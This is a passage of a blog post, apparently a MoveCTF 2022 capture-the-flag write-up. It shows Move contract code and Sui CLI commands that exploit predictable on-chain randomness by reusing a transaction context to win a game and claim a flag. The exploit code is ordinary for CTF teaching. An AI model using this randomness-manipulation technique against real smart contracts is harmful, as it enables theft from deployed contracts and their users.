</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>winTreasureBox</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>Hero</span><span class=p>,</span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>ctx_</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>morphContext</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>rand_u64_range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=n>ctx_</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=o>&lt;=</span><span class=mi>105</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>slay_boar</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=n>ctx_</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>level_up</span><span class=p>(</span><span class=n>hero</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>slay_boar_king</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=n>ctx_</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>Explanation:</p><p>Entry fun 1.</p><ol><li>First we have to win the slay_boar to get sword (sworg give strength to hero)</li><li>It can be possible when randomFuntion(ctx) == 0</li><li>So, Now if can able to morphed the ctx on our contract side which results to give 0 when random funtions calls we can use move forward.</li><li>If we use the same ctx for next 100 times, every time slay_boar will loose and hero strength will increase.</li><li>So we can level up the hero with the same ctx</li><li>our Hero HP, Strength, Defence becomes x2 and Stamina will become 90+ [becomes Strength = 20, Defence = 10, HP = 200 ]</li><li>so slay_boar_king&rsquo;s MIN Strength will be less than our strength, Defence will be same as our Hero&rsquo;s,</li><li>If we&rsquo;re in the same ctx, ofc it return 0 and we will win slay_boar_king,</li><li>then Treasure created and transfered to called pub key.</li><li>return</li></ol><p>Note: Gas must be so high, because of computation.</p><p>Entry fun 2.</p><ol><li>This function takes two args - Treasurebox ID and ctx</li><li>Like previous methodology, morph the ctx, so if we able to return 0 from ctx.</li><li>call get_flag with parameters.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sui client --call --function winTreasureBox --module attack --package &lt;ourDeployedAddress&gt; --args &lt;HeroAddress&gt; --gas-budget <span class=m>10000</span>
</span></span><span class=line><span class=cl>  <span class=p>;</span> <span class=c1># TRANSACTION OUTPUT</span>
</span></span><span class=line><span class=cl>  <span class=p>;</span> <span class=c1># Mutated Objects</span>
</span></span><span class=line><span class=cl>  <span class=p>;</span> <span class=c1># ...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sui client --call --function getFlag --module attack --package &lt;ourDeployedAddress&gt; --args&lt;TresaureBoxAddress&gt; --gas-budget <span class=m>1000</span>
</span></span></code></pre></div><p>Done.</p><p>I enjoyed a lot of cool stuff this weekend, amn&rsquo;t I?</p></div><hr><div class="post-navs d-flex mb-3 justify-content-evenly"><div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
<a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></div></div><section class=related-posts-wrapper><h3>Related Posts</h3><ul class=related-posts><li><a href=https://0x4ka5h.github.io/posts/2048withpython/>2048 With Python</a></li><li><a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/invaderctf-writeups/>InvaderCTF Writeups</a></li><li><a href=https://0x4ka5h.github.io/about/>About</a></li><li><a href=https://0x4ka5h.github.io/posts/vehicleaccidentdetectionusingfpga/>Vehicle Accident Detection Using FPGA</a></li></ul></section></div></article></div></div><aside class="col-lg-4 sidebar d-flex"><div class=container><section class="card row text-center profile component"><div class=card-body><div class="col-12 d-flex align-items-center justify-content-center"><img class="profile-avatar rounded-circle" alt="Akash Thota" src=https://0x4ka5h.github.io/images/me.jpg loading=lazy></div><div class="col-12 profile-meta"><div class=profile-name>Akash Thota</div><div class=profile-bio>Intrested about WEB 3.0 and Block Chain technologies</div><div class=profile-company><i class="fas fa-fw fa-building"></i> ...</div><br><div class=profile-location><i class="fas fa-fw fa-map-marker-alt"></i> India</div><br><div class=profile-about><i class="fas fa-fw fa-user"></i><a href=https://0x4ka5h.github.io/about/> About Me</a></div><br></div></div></section><section class="recent-posts row card component"><div class=card-body><h2 class=card-title>Recent Posts</h2><ul><li><a href=https://0x4ka5h.github.io/posts/movectf-2022/>MoveCTF 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/invaderctf-writeups/>InvaderCTF Writeups</a></li><li><a href=https://0x4ka5h.github.io/posts/depthestimationofapothole/>Depth Estimation of a Pothole on Roads</a></li><li><a href=https://0x4ka5h.github.io/posts/vehicleaccidentdetectionusingfpga/>Vehicle Accident Detection Using FPGA</a></li></ul></div></section><section class="taxonomies row card component"><div class=card-body><h2 class=card-title><a href=https://0x4ka5h.github.io/categories>Categories</a></h2><div><a href=https://0x4ka5h.github.io/categories/ctf/ class="badge bg-primary text-white rounded post-taxonomy" title=CTF>CTF
</a><a href=https://0x4ka5h.github.io/categories/security/ class="badge bg-primary text-white rounded post-taxonomy" title=Security>Security
</a><a href=https://0x4ka5h.github.io/categories/gans/ class="badge bg-primary text-white rounded post-taxonomy" title="GAN's">GAN's
</a><a href=https://0x4ka5h.github.io/categories/writeups/ class="badge bg-primary text-white rounded post-taxonomy" title=WriteUps>WriteUps
</a><a href=https://0x4ka5h.github.io/categories/computer-vision/ class="badge bg-primary text-white rounded post-taxonomy" title="Computer Vision">Computer Vision
</a><a href=https://0x4ka5h.github.io/categories/fpga/ class="badge bg-primary text-white rounded post-taxonomy" title=FPGA>FPGA
</a><a href=https://0x4ka5h.github.io/categories/game/ class="badge bg-primary text-white rounded post-taxonomy" title=Game>Game
</a><a href=https://0x4ka5h.github.io/categories/move/ class="badge bg-primary text-white rounded post-taxonomy" title=Move>Move
</a><a href=https://0x4ka5h.github.io/categories/smart-contract/ class="badge bg-primary text-white rounded post-taxonomy" title="Smart Contract">Smart Contract
</a><a href=https://0x4ka5h.github.io/categories/socket/ class="badge bg-primary text-white rounded post-taxonomy" title=Socket>Socket</a></div></div></section><section class="taxonomies row card component"><div class=card-body><h2 class=card-title><a href=https://0x4ka5h.github.io/tags>Tags</a></h2><div><a href=https://0x4ka5h.github.io/tags/image-processing/ class="badge bg-primary text-white rounded post-taxonomy" title="Image Processing">Image Processing
</a><a href=https://0x4ka5h.github.io/tags/deep-learning/ class="badge bg-primary text-white rounded post-taxonomy" title="Deep Learning">Deep Learning
</a><a href=https://0x4ka5h.github.io/tags/machine-learning/ class="badge bg-primary text-white rounded post-taxonomy" title="Machine Learning">Machine Learning
</a><a href=https://0x4ka5h.github.io/tags/misc/ class="badge bg-primary text-white rounded post-taxonomy" title=Misc>Misc
</a><a href=https://0x4ka5h.github.io/tags/crypto/ class="badge bg-primary text-white rounded post-taxonomy" title=Crypto>Crypto
</a><a href=https://0x4ka5h.github.io/tags/de10nano/ class="badge bg-primary text-white rounded post-taxonomy" title=DE10Nano>DE10Nano
</a><a href=https://0x4ka5h.github.io/tags/face-detection/ class="badge bg-primary text-white rounded post-taxonomy" title="Face Detection">Face Detection
</a><a href=https://0x4ka5h.github.io/tags/imageprocessing/ class="badge bg-primary text-white rounded post-taxonomy" title=ImageProcessing>ImageProcessing
</a><a href=https://0x4ka5h.github.io/tags/nodemcu/ class="badge bg-primary text-white rounded post-taxonomy" title=NodeMCU>NodeMCU
</a><a href=https://0x4ka5h.github.io/tags/opencv/ class="badge bg-primary text-white rounded post-taxonomy" title=openCV>openCV</a></div></div></section></div></aside></div></main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"><a class="nav-link social-link" target=_blank href=https://discord.com/invite/0x4ka5h title=Discord rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-discord"></i>
</a><a class="nav-link social-link" href=mailto:0x4ka5h@gmail.com title=Email><i class="fas fa-fw fa-2x fa-envelope"></i>
</a><a class="nav-link social-link" target=_blank href=https://github.com/0x4ka5h title=GitHub rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link" target=_blank href=https://linkedin.com/in/0x4ka5h title=LinkedIn rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-linkedin-in"></i>
</a><a class="nav-link social-link" target=_blank href=https://twitter.com/0x4ka5h title=Twitter rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-twitter"></i></a></nav><div class="copyright mb-2">Copyright © 2018-2022 Akash Thota. All Rights Reserved.</div></footer><script src=https://0x4ka5h.github.io/js/bundle.min.dfff1fab09c570894e719d1447ee731c8bb5a1e57e18d45beff274823da322f0.js integrity="sha256-3/8fqwnFcIlOcZ0UR+5zHIu1oeV+GNRb7/J0gj2jIvA=" crossorigin=anonymous defer></script><script defer src=https://0x4ka5h.github.io/js/viewer.min.2b366f6cb186c9ce6e41936589e36005bc87d36452602e9aea75f196009e8b95.js integrity="sha256-KzZvbLGGyc5uQZNlieNgBbyH02RSYC6a6nXxlgCei5U=" crossorigin=anonymous></script><script defer src=https://0x4ka5h.github.io/js/katex.min.affcdb0c3de1260e0074ae86bffee9280f85eb73debefdce021e5d030c262a17.js integrity="sha256-r/zbDD3hJg4AdK6Gv/7pKA+F63Pevv3OAh5dAwwmKhc=" crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-213801925-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>